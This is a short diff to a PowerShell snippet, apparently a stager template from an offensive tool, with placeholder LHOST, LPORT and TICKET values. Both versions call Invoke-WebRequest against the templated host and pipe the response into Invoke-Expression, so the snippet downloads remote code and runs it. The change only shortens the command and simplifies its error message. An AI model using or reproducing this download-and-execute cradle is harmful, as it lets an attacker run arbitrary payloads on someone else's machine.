@@ -1,5 +1,5 @@
 try {
-    IWR -Uri "http://*LHOST*:*LPORT*/*TICKET*" -UseBasicParsing | Select-Object -ExpandProperty Content | IEX;
+    IWR "http://*LHOST*:*LPORT*/*TICKET*" -UseBasicParsing | IEX;
 } catch {
-    Write-Host "Error: $($_.Exception.Message)";
+    echo $_.Exception.Message;
 }
